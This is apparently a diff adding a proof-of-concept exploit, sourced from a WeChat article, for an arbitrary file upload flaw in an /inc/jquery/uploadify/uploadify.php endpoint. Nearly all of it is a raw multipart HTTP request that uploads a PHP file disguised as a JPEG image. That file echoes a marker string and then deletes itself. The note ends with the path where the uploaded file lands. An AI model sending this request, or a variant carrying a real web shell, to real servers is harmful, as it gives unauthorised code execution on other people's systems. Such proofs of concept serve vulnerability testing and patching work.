@@ -1,0 +1,27 @@
+poc来自：https://mp.weixin.qq.com/s/kgEec5abI13lmgh4rtH6Qw
+
+
+POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+Connection: close
+Content-Length: 259
+Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+Accept-Encoding: gzip
+
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
+Content-Type: image/jpeg
+
+
+<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
+
+
+--e64bdf16c554bbc109cecef6451c26a4--
+
+
+
+
+
+上传文件所在路径：
+/attachment/3466744850/xxx.php
